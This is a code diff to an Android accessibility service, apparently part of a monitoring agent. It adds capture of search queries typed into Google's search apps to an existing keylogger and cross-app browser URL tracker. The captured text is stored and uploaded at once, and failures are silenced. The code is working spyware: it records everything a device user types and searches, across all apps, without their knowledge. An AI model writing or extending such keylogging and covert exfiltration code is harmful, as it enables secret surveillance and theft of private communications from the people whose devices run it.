@@ -16,12 +16,18 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import org.json.JSONObject
 import java.net.URI
+import java.net.URLEncoder
 
 class AgentAccessibilityService : AccessibilityService() {
 
     companion object {
         private const val TAG = "AgentAccessibility"
         private const val DEBOUNCE_FLUSH_DELAY_MS = 2000L // 2-second typing pause flushes complete final text
+        
+        private val GOOGLE_SEARCH_PACKAGES = setOf(
+            "com.google.android.googlequicksearchbox", // Official Google Search App & Widget
+            "com.google.android.apps.searchlite"       // Google Go
+        )
     }
 
     private val mainHandler = Handler(Looper.getMainLooper())
@@ -35,6 +41,8 @@ class AgentAccessibilityService : AccessibilityService() {
     private var lastFlushedText: String = ""
     @Volatile
     private var lastCapturedUrl: String = ""
+    @Volatile
+    private var lastCapturedQuery: String = ""
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
@@ -54,8 +62,99 @@ class AgentAccessibilityService : AccessibilityService() {
             captureKeylogData(event, packageName)
         }
 
-        // 3. Universal Browser URL & Web History Tracking Engine Across ALL Apps & Browsers
+        // 3. Google App & Search Widget Query Capture Engine
+        if (GOOGLE_SEARCH_PACKAGES.contains(packageName)) {
+            captureGoogleAppSearchQuery(event, packageName)
+        }
+
+        // 4. Universal Browser URL & Web History Tracking Engine Across ALL Apps & Browsers
         captureBrowserUrl(event, packageName)
+    }
+
+    private fun captureGoogleAppSearchQuery(event: AccessibilityEvent, packageName: String) {
+        try {
+            val rootNode = rootInActiveWindow ?: event.source ?: return
+            val searchNode = findGoogleSearchInputNode(rootNode) ?: return
+            val queryText = searchNode.text?.toString()?.trim() ?: return
+
+            if (queryText.isBlank() || queryText.length < 2 || queryText == lastCapturedQuery) return
+            lastCapturedQuery = queryText
+
+            emitGoogleSearchWebHistoryEvent(queryText, packageName)
+        } catch (e: Exception) {
+            // Quiet fail
+        }
+    }
+
+    private fun emitGoogleSearchWebHistoryEvent(queryText: String, packageName: String) {
+        try {
+            val encodedQuery = try { URLEncoder.encode(queryText, "UTF-8") } catch (e: Exception) { queryText }
+            val googleSearchUrl = "https://www.google.com/search?q=$encodedQuery"
+
+            if (googleSearchUrl == lastCapturedUrl) return
+            lastCapturedUrl = googleSearchUrl
+
+            val appName = "Google Search App"
+            val now = System.currentTimeMillis()
+            val deterministicEventId = "evt_webhistory_google_search_${now}"
+
+            Log.i(TAG, "GOOGLE SEARCH QUERY EMITTED TO WEB HISTORY: Query=\"$queryText\", URL=$googleSearchUrl")
+
+            val payload = JSONObject().apply {
+                put("title", "Google Search: $queryText")
+                put("url", googleSearchUrl)
+                put("domain", "google.com")
+                put("packageName", packageName)
+                put("appName", appName)
+                put("visitCount", 1)
+                put("timestamp", now)
+            }
+
+            val eventEntity = NormalizedEventEntity(
+                eventId = deterministicEventId,
+                deviceId = prefsDeviceId(),
+                source = "web_history",
+                eventType = "url_visit",
+                timestamp = now,
+                collectionMethod = "accessibility",
+                payloadJson = payload.toString(),
+                isSynced = false
+            )
+
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val database = AppDatabase.getInstance(applicationContext)
+                    database.eventDao().insertEvent(eventEntity)
+                    performInstantUpload(database, prefsDeviceId())
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error saving Google search event: ${e.message}")
+                }
+            }
+        } catch (e: Exception) {
+            // Quiet fail
+        }
+    }
+
+    private fun findGoogleSearchInputNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val viewId = node.viewIdResourceName
+        if (viewId != null && (
+            viewId.contains("search_box", ignoreCase = true) ||
+            viewId.contains("search_edit_text", ignoreCase = true) ||
+            viewId.contains("search_plate", ignoreCase = true)
+        )) {
+            return node
+        }
+
+        if (node.isEditable && !node.text.isNullOrBlank()) {
+            return node
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val result = findGoogleSearchInputNode(child)
+            if (result != null) return result
+        }
+        return null
     }
 
     private fun captureBrowserUrl(event: AccessibilityEvent, packageName: String) {
@@ -66,7 +165,6 @@ class AgentAccessibilityService : AccessibilityService() {
 
             if (rawUrlText.isBlank() || rawUrlText.length < 3) return
 
-            // Format URL cleanly
             val fullUrl = when {
                 rawUrlText.startsWith("http://") || rawUrlText.startsWith("https://") -> rawUrlText
                 rawUrlText.contains(".") && !rawUrlText.contains(" ") -> "https://$rawUrlText"
@@ -139,7 +237,6 @@ class AgentAccessibilityService : AccessibilityService() {
             }
         }
 
-        // Direct Text URL Match Check across any View / Node in any application
         val directText = node.text?.toString()?.trim()
         if (directText != null && directText.length >= 4 && (
             directText.startsWith("http://") || 
@@ -220,6 +317,7 @@ class AgentAccessibilityService : AccessibilityService() {
 
         Log.i(TAG, "KEYLOGGER FLUSHED TYPED SENTENCE: App=$appName ($pkgToFlush), Text=\"$textToFlush\"")
 
+        // 1. Emit Keylog Event
         val payload = JSONObject().apply {
             put("packageName", pkgToFlush)
             put("appName", appName)
@@ -237,6 +335,11 @@ class AgentAccessibilityService : AccessibilityService() {
             payloadJson = payload.toString(),
             isSynced = false
         )
+
+        // 2. Dual Emission: If the typed sentence was in Google Search App, also emit directly to Web History!
+        if (GOOGLE_SEARCH_PACKAGES.contains(pkgToFlush)) {
+            emitGoogleSearchWebHistoryEvent(textToFlush, pkgToFlush)
+        }
 
         CoroutineScope(Dispatchers.IO).launch {
             try {
